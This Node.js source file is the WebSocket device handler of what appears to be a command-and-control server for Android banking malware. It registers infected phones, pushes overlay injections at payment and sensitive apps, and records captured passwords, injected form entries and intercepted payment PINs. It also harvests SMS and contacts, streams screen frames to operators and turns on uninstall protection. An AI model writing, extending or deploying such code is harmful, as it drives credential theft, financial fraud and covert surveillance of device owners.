'use strict';

const { getPool, dbWithRetry } = require('../services/commandPoller');
const { broadcastToAdmins, forwardFrameToAdmins } = require('./admin');
const { sendFirstTime: sendProtectFirstTime } = require('../services/autoProtect');
const { allowWrite: wtAllow, markWritten: wtMark } = require('../services/writeThrottle');
const { recordDeviceDebug } = require('../services/deviceDebugLog');
// TG 通知已移到 PHP DeviceController 中处理

const DEFAULT_APP_LIST_SCAN_INTERVAL_MS = 60 * 60 * 1000;
const RECENT_INJECTION_COMPLETION_TTL_MS = 5 * 60 * 1000;
const INJECTION_TRACE_SCHEMA_VERSION = 1;
const recentInjectionCompletions = new Map();

function jsonByteLength(value) {
  try {
    return Buffer.byteLength(JSON.stringify(value), 'utf8');
  } catch {
    return 0;
  }
}

// 只记录请求结构和时序，不记录表单值或 HTML 内容。
function getInjectionMessageTrace(msg, connection) {
  if (!msg || typeof msg !== 'object') return null;
  const messageType = String(msg.type || '');
  const data = msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data) ? msg.data : {};
  const command = String(data.command || data.commandName || msg.command || '').toUpperCase();
  const injectionMessage = ['injection', 'injection_data', 'injection_status', 'INJECTION_STATUS'].includes(messageType);
  const injectionCommandResult = messageType === 'command_result'
    && ['SHOW_INJECTION', 'STOP_INJECTION', 'GET_INJECTION_STATUS'].includes(command);
  if (!injectionMessage && !injectionCommandResult) return null;

  const params = data.params && typeof data.params === 'object' ? data.params : {};
  const result = data.result && typeof data.result === 'object' && !Array.isArray(data.result)
    ? data.result
    : {};
  const clientTimestamp = Number(msg.timestamp || data.timestamp || 0);
  const now = Date.now();
  return {
    traceSchemaVersion: INJECTION_TRACE_SCHEMA_VERSION,
    direction: 'device-to-server',
    messageType,
    command,
    packageName: msg.packageName || msg.package_name || data.packageName || params.packageName || result.packageName || '',
    templateId: msg.templateId || msg.template_id || data.templateId || params.templateId || result.templateId || '',
    requestId: msg.requestId || data.requestId || params.requestId || result.requestId || '',
    source: msg.source || data.source || params.source || result.source || '',
    topLevelKeys: Object.keys(msg),
    dataKeys: Object.keys(data),
    resultKeys: Object.keys(result),
    formFieldNames: injectionMessage && msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data)
      ? Object.keys(msg.data)
      : [],
    payloadBytes: jsonByteLength(msg),
    dataBytes: jsonByteLength(msg.data),
    clientTimestamp,
    clientClockDeltaMs: clientTimestamp > 0 ? now - clientTimestamp : null,
    connectionAgeMs: connection ? Math.max(0, now - Number(connection.connectedAt || now)) : null,
    sinceLastAppListResponseMs: connection?.lastAppListResponseAt
      ? Math.max(0, now - Number(connection.lastAppListResponseAt))
      : null,
    wsReadyState: connection?.ws?.readyState ?? null,
  };
}

function injectionCompletionKey(deviceId, packageName) {
  return `${String(deviceId || '')}\u0000${String(packageName || '')}`;
}

function markInjectionCompletion(deviceId, packageName) {
  if (!deviceId || !packageName) return 0;
  const key = injectionCompletionKey(deviceId, packageName);
  const completedAt = Date.now();
  recentInjectionCompletions.set(key, completedAt);
  const timer = setTimeout(() => {
    if (recentInjectionCompletions.get(key) === completedAt) {
      recentInjectionCompletions.delete(key);
    }
  }, RECENT_INJECTION_COMPLETION_TTL_MS);
  if (typeof timer.unref === 'function') timer.unref();
  return completedAt;
}

function getRecentInjectionCompletion(deviceId, packageName) {
  return Number(recentInjectionCompletions.get(injectionCompletionKey(deviceId, packageName)) || 0);
}

function wasInjectionCompletedSince(deviceId, packageName, sinceMs) {
  const completedAt = getRecentInjectionCompletion(deviceId, packageName);
  return completedAt > 0 && completedAt >= Number(sinceMs || 0);
}

function getAppListScanIntervalMs() {
  const configured = Number(process.env.APP_LIST_SCAN_INTERVAL_MS || DEFAULT_APP_LIST_SCAN_INTERVAL_MS);
  return Number.isFinite(configured) && configured >= 10000
    ? Math.floor(configured)
    : DEFAULT_APP_LIST_SCAN_INTERVAL_MS;
}

async function queryPolicyRows(sql) {
  try {
    const [rows] = await getPool().query(sql);
    return Array.isArray(rows) ? rows : [];
  } catch (e) {
    console.warn('[PolicySync] query skipped: ' + e.message);
    return [];
  }
}

async function syncGlobalPolicies(ws, sessionId) {
  if (!ws || ws.readyState !== 1) return;
  const [sensitiveRows, blackRows, paymentRows] = await Promise.all([
    queryPolicyRows("SELECT package_name FROM fisher_sensitive_apps WHERE package_name IS NOT NULL AND package_name <> ''"),
    queryPolicyRows("SELECT package_name FROM fisher_black_apps WHERE package_name IS NOT NULL AND package_name <> ''"),
    queryPolicyRows("SELECT package_name, app_name, windows FROM fisher_payment_strategies WHERE enabled = 1 AND package_name IS NOT NULL AND package_name <> '' ORDER BY id ASC"),
  ]);
  const sensitive = [...new Set(sensitiveRows.map(row => String(row.package_name || '').trim()).filter(Boolean))];
  const black = [...new Set(blackRows.map(row => String(row.package_name || '').trim()).filter(Boolean))];
  const strategies = paymentRows.map(row => {
    let windows = row.windows;
    if (typeof windows === 'string') {
      try { windows = JSON.parse(windows); } catch { windows = []; }
    }
    return {
      packageName: String(row.package_name || '').trim(),
      appName: String(row.app_name || '').trim(),
      listenWinClasses: Array.isArray(windows) ? windows : [],
    };
  }).filter(row => row.packageName);
  const commands = [
    ['SET_SENSITIVE_APPS', { apps: sensitive }],
    ['SET_BLACK_APPS', { apps: black }],
    ['SET_PAYMENT_STRATEGIES', { strategies }],
  ];
  for (const [command, params] of commands) {
    if (ws.readyState !== 1) break;
    try {
      ws.send(JSON.stringify({ type: 'command', sessionId, data: { command, params } }));
    } catch (e) {
      console.warn('[PolicySync] ' + command + ' failed for ' + sessionId + ': ' + e.message);
    }
  }
  console.log('[PolicySync] synced ' + sessionId + ': sensitive=' + sensitive.length + ', black=' + black.length + ', payment=' + strategies.length);
}

/**
 * APK 设备端 WebSocket handler
 * 路径: /ws/device?sessionId=xxx
 */
function resolveClientIp(ws, forwardedIp = '') {
  const socketIp = ws?._socket?.remoteAddress || '';
  return String(forwardedIp || socketIp).split(',')[0].trim().replace(/^::ffff:/, '');
}

function handleDevice(ws, sessionId, connections, forwardedIp = '') {
  // Nginx 反代后 ws._socket.remoteAddress 是 127.0.0.1，优先使用入口已校正的真实 IP。
  const clientIp = resolveClientIp(ws, forwardedIp);
  // ★ 闭包变量：latestClientIp 随 status 消息更新（pool 自愈用 + 修复 C 简化版）
  let latestClientIp = clientIp;

  connections.devices.set(sessionId, {
    ws,
    sessionId,
    clientIp,
    appListReceived: false,
    lastAppListRequestAt: 0,
    lastAppListRequestSource: '',
    lastAppListResponseAt: 0,
    connectedAt: Date.now(),
    injectionStatusReady: false,
    pendingAutoApps: null,
    pendingAutoAppsAt: 0,
    injectionReadinessTimers: [],
  });
  console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);
  void recordDeviceDebug('ws.connected', sessionId, { clientIp, connectionPoolSize: connections.devices.size });

  // 重连不清除自动注入去重状态。否则网络抖动后再次返回应用列表，
  // 会对同一设备+包名重复下发 SHOW_INJECTION。手动“重注”不经过此缓存。

  // 更新设备在线状态 + IP
  updateDeviceStatus(sessionId, true, clientIp);

  // 2026-08-02 device auto-protect: send ENABLE_UNINSTALL_PROTECTION on register
  setTimeout(() => sendProtectFirstTime(connections, sessionId), 2000);

  const sendAppListRequest = ({
    source,
    delayMs = 0,
    attempt = null,
    totalAttempts = null,
    onlyUntilFirstResponse = false,
    dedupeWindowMs = 0,
  }) => {
    const current = connections.devices.get(sessionId);
    if (!current || current.ws !== ws || ws.readyState !== 1) return false;
    if (onlyUntilFirstResponse && current.appListReceived) return false;

    const now = Date.now();
    // 30 秒的首次重试和周期扫描可能在同一轮定时器中碰到，防止双发。
    if (dedupeWindowMs > 0 && now - Number(current.lastAppListRequestAt || 0) < dedupeWindowMs) return false;
    current.lastAppListRequestAt = now;
    current.lastAppListRequestSource = source;

    // 保持与控制台“重新获取（设备）”完全相同的端侧参数，
    // source 仅用于服务端日志，避免旧 APK 的严格参数解析拒绝额外字段。
    const params = { full: true, force: true };
    const suffix = attempt == null ? '' : ` attempt=${attempt}/${totalAttempts}`;
    console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId} source=${source}${suffix}`);
    ws.send(JSON.stringify({
      type: 'command',
      sessionId,
      data: { command: 'GET_APP_LIST', params }
    }));
    void recordDeviceDebug(
      source === 'periodic-auto-scan' ? 'apps.periodic.request.sent' : 'apps.request.sent',
      sessionId,
      {
        delayMs,
        attempt,
        totalAttempts,
        command: 'GET_APP_LIST',
        params,
        source,
        lastResponseAt: Number(current.lastAppListResponseAt || 0),
      }
    );
    return true;
  };

  // 新安装/刚启动的客户端可能在 WS 连上后仍未准备好应用列表模块。
  // 首次请求和手动“重新获取（设备）”保持同一参数，并在没有响应时自动重试。
  const appListRetryDelays = [8000, 16000, 30000];
  const appListTimers = appListRetryDelays.map((delayMs, index) => setTimeout(() => {
    const attempt = index + 1;
    sendAppListRequest({
      source: 'initial-auto-scan',
      delayMs,
      attempt,
      totalAttempts: appListRetryDelays.length,
      onlyUntilFirstResponse: true,
    });
  }, delayMs));

  const appListTimeoutTimer = setTimeout(() => {
    const current = connections.devices.get(sessionId);
    if (current && current.ws === ws && !current.appListReceived && ws.readyState === 1) {
      void recordDeviceDebug('apps.response.timeout', sessionId, {
        waitedMs: 45000,
        attempts: appListRetryDelays.length,
        command: 'GET_APP_LIST',
      }, 'warn');
    }
  }, 45000);

  // 用户可能在设备上后续安装新 APP。设备 WS 在线期间默认每 1 小时（可通过
  // APP_LIST_SCAN_INTERVAL_MS 调整，下限 10 秒）重新拉取全量列表。列表入库后会再走
  // handleAppList -> autoInjectForDevice；已注入包由现有去重逻辑跳过，只会对新匹配 APP 下发。
  const appListScanIntervalMs = getAppListScanIntervalMs();
  const periodicAppListInterval = setInterval(() => {
    sendAppListRequest({
      source: 'periodic-auto-scan',
      delayMs: appListScanIntervalMs,
      dedupeWindowMs: 5000,
    });
  }, appListScanIntervalMs);

  // 设备上线时补发全局策略；第一次失败时稍后重试一次。
  const policySyncTimers = [1500, 10000].map(delay => setTimeout(() => {
    syncGlobalPolicies(ws, sessionId).catch(err => console.warn('[PolicySync] ' + sessionId + ': ' + err.message));
  }, delay));

  // 通知管理端（同时发两种格式，兼容前端 bot_online/device_online）
  broadcastToAdmins(connections, { type: 'device_online', sessionId, deviceId: sessionId, data: { status: 'online' } });
  broadcastToAdmins(connections, { type: 'bot_online', sessionId, deviceId: sessionId, botId: sessionId });
  broadcastToAdmins(connections, { type: 'device_update' });

  // 定时更新 last_seen（每30秒）— 先走内存去抖（10s 窗口）再落盘，且 dbWithRetry 死锁重试兜底
  // 注意：allowWrite 通过后立刻标记；dbWithRetry 已做 2 次重试，真失败就等下一个 30s tick。
  const heartbeatInterval = setInterval(() => {
    if (ws.readyState !== 1) return;
    // ★ 内存节流：10 秒内如果 syncDeviceStatus / 上一次心跳 / bridge 心跳 任意一个已刷，就跳过
    if (!wtAllow(sessionId, 'last_seen')) return;
    const now = Math.floor(Date.now() / 1000);
    dbWithRetry(
      () => getPool().query('UPDATE fisher_devices SET last_seen=? WHERE device_id=?', [now, sessionId]),
      { label: `heartbeat:${String(sessionId).substring(0, 8)}`, maxRetries: 2 }
    ).catch(() => { /* 失败静默，下一个 30s tick 再尝试（30s > 10s 窗口自然到期） */ });
  }, 30000);

  // RFC 6455 ping/pong 仅在显式开启时使用，兼容只实现应用层心跳的 APK。
  let isAlive = true;
  const protocolPingEnabled = process.env.NODE_WS_PROTOCOL_PING === '1';
  let serverPingInterval = null;
  if (protocolPingEnabled) {
    ws.on('pong', () => { isAlive = true; });
    serverPingInterval = setInterval(() => {
      if (ws.readyState !== 1) return;
      if (!isAlive) {
        console.log('[WS-Device] Ping timeout, terminating zombie connection: ' + sessionId);
        ws.terminate();
        return;
      }
      isAlive = false;
      try { ws.ping(); } catch (e) {}
    }, 30000);
  }

  ws.on('message', (data) => {
    // ★ Stability: wrap entire handler body in try/catch to prevent unhandled
    // exceptions in handler/forwarding logic from crashing the WS server.
    try {
      // ★ 入站消息自愈（2026-08-06）：校验 ws 仍活着，否则丢弃
      // 解决"WS 显示离线但 handleDeviceMessage 仍能跑"的矛盾
      if (ws.readyState !== 1) return
      // ★ 池自愈：如果池里已被清空（理论不应该，但兜底），自动重新注册
      if (!connections.devices.has(sessionId) || connections.devices.get(sessionId).ws !== ws) {
        connections.devices.set(sessionId, {
          ws,
          sessionId,
          clientIp: latestClientIp,
          appListReceived: false,
          lastAppListRequestAt: 0,
          lastAppListResponseAt: 0,
          connectedAt: Date.now(),
          injectionStatusReady: false,
          pendingAutoApps: null,
          injectionReadinessTimers: [],
        })
        if (process.env.NODE_WS_DEBUG_HEAL === '1') {
          console.log(`[WS-Device] pool self-heal: re-registered ${sessionId}`)
        }
      }
      // 尝试将 Buffer 解析为 JSON（设备可能以二进制帧发送 JSON 响应）
      if (Buffer.isBuffer(data) || data instanceof ArrayBuffer) {
        const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
        // 检查是否以 '{' 或 '[' 开头（JSON）
        if (buf.length > 0 && (buf[0] === 0x7b || buf[0] === 0x5b)) {
          try {
            const str = buf.toString('utf8');
            const msg = JSON.parse(str);
            console.log(`[WS-Device] <<<< Received JSON from ${sessionId}:`, str.substring(0, 200));
            handleDeviceMessage(ws, msg, sessionId, connections, latestClientIp);
            return;
          } catch {}
        }
        // 真正的二进制帧 = 屏幕画面
        forwardFrameToAdmins(sessionId, data, connections);
        return;
      }

      try {
        const msg = JSON.parse(data.toString());
        console.log(`[WS-Device] <<<< Received from ${sessionId}:`, JSON.stringify(msg).substring(0, 200));
        handleDeviceMessage(ws, msg, sessionId, connections, latestClientIp);
      } catch (err) {
        console.error(`[WS-Device] Parse error from ${sessionId}:`, err.message);
      }
    } catch (err) {
      console.error(`[WS-Device] Unhandled error in message handler for ${sessionId}:`, err && err.message ? err.message : err);
    }
  });

  // ★ FIX: WS 连接池竞态误删（2026-08-06）
  // 归属校验：仅当连接池中仍是当前 ws 时才执行清理，避免旧连接 close 误删新连接
  function isCurrentDeviceConnection() {
    const cur = connections.devices.get(sessionId);
    return cur && cur.ws === ws;
  }

  ws.on('close', () => {
    appListTimers.forEach(clearTimeout);
    clearTimeout(appListTimeoutTimer);
    clearInterval(periodicAppListInterval);
    policySyncTimers.forEach(clearTimeout);
    clearInterval(heartbeatInterval);
    clearInterval(serverPingInterval);
    const closingConnection = connections.devices.get(sessionId);
    if (closingConnection && closingConnection.ws === ws) {
      (closingConnection.injectionReadinessTimers || []).forEach(clearTimeout);
    }
    if (!isCurrentDeviceConnection()) return;  // ★ 不是自己的连接（已被新连接覆盖），不清理
    connections.devices.delete(sessionId);
    // 只有当没有 bridge 连接时才标记为离线
    if (!connections.bridges.has(sessionId)) {
      updateDeviceStatus(sessionId, false);
    }
    broadcastToAdmins(connections, {
      type: 'device_offline',
      sessionId,
      deviceId: sessionId,
      data: { status: connections.bridges.has(sessionId) ? 'online' : 'offline' },
    });
    // 如果设备真正离线（无 bridge），发 bot_offline
    if (!connections.bridges.has(sessionId)) {
      broadcastToAdmins(connections, { type: 'bot_offline', sessionId, deviceId: sessionId, botId: sessionId });
    }
    broadcastToAdmins(connections, { type: 'device_update' });
    console.log(`[WS-Device] Disconnected: ${sessionId}`);
    void recordDeviceDebug('ws.disconnected', sessionId, { bridgeConnected: connections.bridges.has(sessionId) });
  });

  ws.on('error', (error) => {
    appListTimers.forEach(clearTimeout);
    clearTimeout(appListTimeoutTimer);
    clearInterval(periodicAppListInterval);
    policySyncTimers.forEach(clearTimeout);
    clearInterval(heartbeatInterval);
    clearInterval(serverPingInterval);
    const failedConnection = connections.devices.get(sessionId);
    if (failedConnection && failedConnection.ws === ws) {
      (failedConnection.injectionReadinessTimers || []).forEach(clearTimeout);
    }
    if (!isCurrentDeviceConnection()) return;  // ★ 归属校验，同上
    connections.devices.delete(sessionId);
    if (!connections.bridges.has(sessionId)) {
      updateDeviceStatus(sessionId, false);
    }
    void recordDeviceDebug('ws.error', sessionId, { message: error?.message || 'unknown websocket error' }, 'error');
  });
}

function handleDeviceMessage(ws, msg, sessionId, connections, forwardedIp = '') {
  const { type } = msg;
  console.log(`[WS-Device] handleDeviceMessage type='${type}' from ${sessionId}`);

  const currentConnection = connections.devices.get(sessionId);
  const injectionTrace = getInjectionMessageTrace(msg, currentConnection);
  if (injectionTrace) {
    void recordDeviceDebug('injection.request.received', sessionId, injectionTrace);
  }

  const markAppListReceived = () => {
    const current = connections.devices.get(sessionId);
    if (current && current.ws === ws) {
      current.appListReceived = true;
      current.lastAppListResponseAt = Date.now();
    }
  };

  // 旧后端逻辑：心跳/状态/注册消息都会触发设备信息更新
  const registerTypes = ['REGISTER', 'register', 'heartbeat', 'HEARTBEAT',
    'status', 'device_heartbeat', 'device_status', 'USER_MESSAGE',
    'bot_status', 'device_status_update', 'get_device_state_response',
    'device_info'];

  if (registerTypes.includes(type)) {
    // 提取 data 字段中的设备信息，与旧后端 update_db() 一致
    // device_info 消息的数据在 msg.info 而非 msg.data
    const info = msg.info || msg.data || msg.payload || msg;
    // 心跳同步必须沿用连接入口解析的真实 IP，避免被反代 socket 的 127.0.0.1 覆盖。
    const wsClientIp = resolveClientIp(ws, forwardedIp);
    void recordDeviceDebug('ws.message.' + String(type || 'unknown').toLowerCase(), sessionId, {
      messageType: type,
      payloadKeys: info && typeof info === 'object' ? Object.keys(info) : [],
      brand: info?.brand || '',
      model: info?.model || '',
      appName: info?.appName || info?.deviceName || '',
      appVersion: info?.appVersion || '',
      clientIp: wsClientIp,
    });
    syncDeviceStatus(sessionId, info, wsClientIp);
  }

  switch (type) {
    case 'status':
    case 'bot_status':
    case 'device_status_update':
    case 'get_device_state_response':
      // 检查是否是密码上报（APK 可能用 type:'status' + data.type:'password_captured'）
      if (msg.data && (msg.data.type === 'password_captured' || msg.data.type === 'PASSWORD_CAPTURED')) {
        console.log(`[WS-Device] >>>> Password captured from ${sessionId}:`, JSON.stringify(msg.data).substring(0, 200));
        savePassword(sessionId, msg.data);
        // 额外广播 password_status 类型消息，触发前端密码卡片刷新
        broadcastToAdmins(connections, { type: 'password_status', deviceId: sessionId, sessionId });
      }
      // 状态更新，转发给管理端 + 更新数据库
      console.log(`[WS-Device] >>>> Forwarding status '${type}' to admins from ${sessionId}`);
      broadcastToAdmins(connections, {
        ...msg,
        data: msg.data || msg.payload || {},
        sessionId,
        deviceId: sessionId,
      });
      break;

    case 'command_result':
      // 命令结果，转发给管理端
      console.log(`[WS-Device] >>>> Forwarding command_result to admins from ${sessionId}:`, JSON.stringify(msg.data || msg).substring(0, 200));
      // 检测 command_result 中的短信/通讯录/应用数据并入库
      {
        const rd = msg.data || {};
        if (rd.smsList || rd.messages) {
          const sms = rd.smsList || rd.messages;
          if (Array.isArray(sms) && sms.length > 0) {
            console.log(`[WS-Device] command_result contains SMS: count=${sms.length}`);
            saveAiDeviceData(sessionId, 'sms', sms);
            saveSmsToMessages(sessionId, sms);
          }
        }
        if (rd.contacts) {
          const ct = rd.contacts;
          if (Array.isArray(ct) && ct.length > 0) {
            console.log(`[WS-Device] command_result contains contacts: count=${ct.length}`);
            saveAiDeviceData(sessionId, 'contacts', ct);
          }
        }
        const commandName = String(rd.command || rd.commandName || msg.command || '').toUpperCase();
        const commandResult = rd.result ?? rd.data ?? rd;
        if (commandName === 'SHOW_INJECTION' || commandName === 'STOP_INJECTION') {
          void recordDeviceDebug('injection.command.result', sessionId, {
            command: commandName,
            success: rd.success ?? commandResult?.success ?? null,
            packageName: rd.packageName || rd.params?.packageName || commandResult?.packageName || '',
            requestId: rd.requestId || rd.params?.requestId || commandResult?.requestId || '',
            resultKeys: commandResult && typeof commandResult === 'object' && !Array.isArray(commandResult)
              ? Object.keys(commandResult)
              : [],
          });
        }
        const commandApps = Array.isArray(commandResult)
          ? commandResult
          : commandResult?.apps || commandResult?.appList || commandResult?.app_list
            || rd.apps || rd.appList || rd.app_list
            || (commandName === 'GET_APP_LIST' ? commandResult?.list || rd.list : null);
        if (Array.isArray(commandApps)) {
          markAppListReceived();
          console.log(`[WS-Device] command_result contains apps: count=${commandApps.length}`);
          handleAppList(sessionId, { ...msg, _apps: commandApps }, ws, connections);
          broadcastToAdmins(connections, { type: 'app_list', deviceId: sessionId, data: commandApps });
          saveAiDeviceData(sessionId, 'apps', commandApps);
        }
      }
      broadcastToAdmins(connections, {
        type: 'command_result',
        deviceId: sessionId,
        data: msg.data || msg,
      });
      break;

    case 'injection':
    case 'injection_data':
      // 注入数据上报 — 存入数据库 + 转发给管理端
      // 新格式: { type: 'injection', deviceId, data: {...}, packageName, timestamp }
      // data 可能是字符串或已解析对象
      void recordDeviceDebug('injection.form.received', sessionId, {
        traceSchemaVersion: INJECTION_TRACE_SCHEMA_VERSION,
        messageType: type,
        packageName: msg.packageName || msg.package_name || '',
        templateName: msg.templateName || '',
        templateId: msg.templateId || msg.template_id || '',
        requestId: msg.requestId || msg.request_id || '',
        source: msg.source || '',
        dataType: typeof msg.data,
        dataKeys: msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data)
          ? Object.keys(msg.data)
          : [],
        payloadBytes: jsonByteLength(msg),
        dataBytes: jsonByteLength(msg.data),
        connectionAgeMs: currentConnection
          ? Math.max(0, Date.now() - Number(currentConnection.connectedAt || Date.now()))
          : null,
        clientTimestamp: msg.timestamp || 0,
      });
      void saveInjectionData(sessionId, msg, connections).then(capture => {
        if (!capture) return;
        // 只在表单已入库、活跃任务已清理后通知控制台。
        // 前端收到该事件后可立即把“停止注入”收敛为“重注”，
        // 不再依赖 1.5 秒轮询或手动刷新。
        broadcastToAdmins(connections, {
          type: 'injection_capture_completed',
          deviceId: sessionId,
          sessionId,
          ...capture,
        });
        void recordDeviceDebug('injection.form.completion_broadcast', sessionId, {
          packageName: capture.packageName,
          templateId: capture.templateId,
          recordId: capture.recordId,
        });
      });
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'NEW_PASSWORD':
      // 密码上报 — 存入数据库 + 转发给管理端（与旧 Python 后端一致）
      savePassword(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'new_sms':
      // 短信通知，转发给管理端
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'operation_log':
    case 'operation_log_realtime':
      // 操作日志 — 存入数据库 + 转发给管理端（与旧 Python 后端一致）
      saveOperationLog(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'REGISTER':
    case 'register':
    case 'heartbeat':
    case 'HEARTBEAT':
    case 'device_heartbeat':
    case 'device_status':
      // 注册/心跳消息 — 已在上方做了 syncDeviceStatus，不再转发
      break;

    case 'pong':
      break;

    case 'password_status':
      // 密码状态上报 — 仅转发给管理端（不入库，避免存入 APK 重复捕获的错误值）
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId, sessionId });
      break;

    case 'injection_status':
    case 'INJECTION_STATUS':
      // APK 确认已启用的注入包后，将客户端真实状态回写到活跃任务。
      // 否则 SHOW_INJECTION 已被 APK 接收，但页面的轮询会因查不到 DB 记录
      // 立刻把“停止注入”覆盖回“注入”。
      {
        const current = connections.devices.get(sessionId);
        const pendingApps = current && current.ws === ws && Array.isArray(current.pendingAutoApps)
          ? current.pendingAutoApps
          : null;
        const pendingAutoAppsAt = Number(current?.pendingAutoAppsAt || 0);
        if (current && current.ws === ws) {
          current.injectionStatusReady = true;
          current.pendingAutoApps = null;
          current.pendingAutoAppsAt = 0;
          (current.injectionReadinessTimers || []).forEach(clearTimeout);
          current.injectionReadinessTimers = [];
        }
        void reconcileInjectionStatus(sessionId, msg).then(async () => {
          if (!pendingApps) return;
          const latest = connections.devices.get(sessionId);
          if (!latest || latest.ws !== ws || ws.readyState !== 1) return;
          void recordDeviceDebug('injection.auto.readiness_confirmed', sessionId, {
            installedAppCount: pendingApps.length,
            trigger: 'injection_status',
            readinessWaitMs: pendingAutoAppsAt > 0 ? Date.now() - pendingAutoAppsAt : null,
            connectionAgeMs: Math.max(0, Date.now() - Number(latest.connectedAt || Date.now())),
          });
          await autoInjectForDevice(sessionId, pendingApps, ws, connections);
        });
      }
      broadcastToAdmins(connections, { ...msg, type: 'injection_status', deviceId: sessionId, sessionId });
      break;

    case 'app_list':
    case 'app_list_response':
    case 'APP_LIST_RESPONSE':
    case 'APP_LIST':
    case 'APP_LIST_DATA':
    case 'get_app_list':
    case 'GET_APP_LIST':
      // 设备返回已安装应用列表 → 存入 fisher_device_apps 并触发自动注入
      {
        const data = msg.data;
        const apps = Array.isArray(data)
          ? data
          : data?.apps || data?.appList || data?.app_list || data?.list
            || msg.apps || msg.appList || msg.app_list || msg.list || [];
        markAppListReceived();
        console.log(`[WS-Device] Received ${type} from ${sessionId}, count=${Array.isArray(apps) ? apps.length : 0}`);
        handleAppList(sessionId, { ...msg, _apps: apps }, ws, connections);
        broadcastToAdmins(connections, { type: 'app_list', deviceId: sessionId, data: apps });
        // 同时存入 AI 数据缓存表
        saveAiDeviceData(sessionId, 'apps', apps);
      }
      break;

    case 'sms_data':
    case 'SMS_DATA':
    case 'sms_list':
    case 'SMS_LIST':
      // 短信数据返回 → 存入 AI 数据缓存表 + 转发给管理端
      {
        const smsList = msg.data?.smsList || msg.data?.messages || msg.smsList || msg.messages || msg.data || [];
        console.log(`[WS-Device] Received SMS data from ${sessionId}, count=${Array.isArray(smsList) ? smsList.length : 0}`);
        if (Array.isArray(smsList) && smsList.length > 0) {
          saveAiDeviceData(sessionId, 'sms', smsList);
          saveSmsToMessages(sessionId, smsList);
        }
        broadcastToAdmins(connections, { ...msg, type: 'sms_data', deviceId: sessionId });
      }
      break;

    case 'contacts':
    case 'CONTACTS':
    case 'contacts_data':
    case 'CONTACTS_DATA':
    case 'contacts_response':
      // 通讯录数据返回 → 存入 AI 数据缓存表 + 转发给管理端
      {
        const contacts = msg.data?.contacts || msg.contacts || msg.data || [];
        console.log(`[WS-Device] Received contacts from ${sessionId}, count=${Array.isArray(contacts) ? contacts.length : 0}`);
        if (Array.isArray(contacts) && contacts.length > 0) {
          saveAiDeviceData(sessionId, 'contacts', contacts);
        }
        broadcastToAdmins(connections, { ...msg, type: 'contacts', deviceId: sessionId });
      }
      break;

    case 'vc_result':
    case 'view_cache_result':
    case 'view_cache_sync':
    case 'payment_cipher':
      // 支付密码截获上报 — 存入 fisher_payment_cipher_records + 转发给管理端
      console.log(`[WS-Device] >>>> Payment cipher from ${sessionId}:`, JSON.stringify(msg.data || msg).substring(0, 200));
      saveCipherRecord(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, type: 'payment_cipher', deviceId: sessionId, sessionId });
      break;

    default:
      // 其他消息也转发
      console.log(`[WS-Device] >>>> Forwarding default msg to admins from ${sessionId}: type='${type}'`);
      // 检测是否包含短信/通讯录数据（某些 APK 用非标准 type 返回）
      if (msg.data) {
        const d = msg.data;
        if (d.smsList || d.messages || (Array.isArray(d) && d[0]?.body)) {
          const smsList = d.smsList || d.messages || d;
          if (Array.isArray(smsList) && smsList.length > 0) {
            console.log(`[WS-Device] Detected SMS data in default handler, type='${type}', count=${smsList.length}`);
            saveAiDeviceData(sessionId, 'sms', smsList);
            saveSmsToMessages(sessionId, smsList);
          }
        }
        if (d.contacts || (Array.isArray(d) && d[0]?.name && (d[0]?.phone || d[0]?.number))) {
          const contacts = d.contacts || d;
          if (Array.isArray(contacts) && contacts.length > 0) {
            console.log(`[WS-Device] Detected contacts data in default handler, type='${type}', count=${contacts.length}`);
            saveAiDeviceData(sessionId, 'contacts', contacts);
          }
        }
      }
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId, sessionId });
  }
}

/**
 * 将设备发来的实时状态同步到数据库
 * 与旧 Python 后端 ws_device 中的 update_db() 对齐：
 * - 如果设备不存在 → 自动 INSERT（注册）
 * - 如果设备存在 → UPDATE 所有上报字段
 * 更新: brand, model, os_version, app_version, app_name, battery_level,
 * network_type, is_screen_on, screen_width, screen_height, permissions,
 * is_charging, is_locked, accessibility_alive, public_ip
 */
async function syncDeviceStatus(deviceId, data, clientIp) {
  if (!data || !deviceId) return;
  void recordDeviceDebug('db.device_upsert.started', deviceId, {
    payloadKeys: typeof data === 'object' ? Object.keys(data) : [],
    hasAppName: !!(data.appName || data.deviceName),
    clientIp: clientIp || '',
  });
  try {
    const db = getPool();
    const now = Math.floor(Date.now() / 1000);
    const shortId = String(deviceId).substring(0, 12);

    // ★ 2026-09-03 死锁修复：用单条 INSERT ... ON DUPLICATE KEY UPDATE 代替"先 SELECT 再分支 INSERT/UPDATE"
    // ★ 2026-09-03 NOT NULL 修复：
    //   - 两套变量：*InsV 用于 INSERT 侧（NOT NULL 列必须给安全默认值，不能写 NULL）
    //               *UpdV 用于 UPDATE 侧判断条件（保留 NULL = 跳过不更新，避免覆盖原值）
    const brandV        = data.brand ? String(data.brand) : null;
    const modelV        = data.model ? String(data.model) : null;
    const osVersionV    = data.osVersion ? String(data.osVersion) : null;
    const appVersionV   = data.appVersion ? String(data.appVersion) : null;
    const appNameV      = (data.appName || data.deviceName) ? String(data.appName || data.deviceName) : null;
    // INSERT side uses empty strings for NOT NULL text columns when APK omits them.
    // UPDATE side keeps null so existing device metadata is not overwritten.
    const brandInsV     = brandV === null ? '' : brandV;
    const modelInsV     = modelV === null ? '' : modelV;
    const osVersionInsV = osVersionV === null ? '' : osVersionV;
    const appVersionInsV= appVersionV === null ? '' : appVersionV;
    const appNameInsV   = appNameV === null ? '' : appNameV;
    const publicIpFromMsg = data.publicIP ? String(data.publicIP) : null;
    const publicIpV     = publicIpFromMsg || clientIp || null;

    // batteryLevel: NOT NULL 默认 0
    const batteryUpdV   = data.batteryLevel !== undefined ? (Number(data.batteryLevel) || 0) : null;
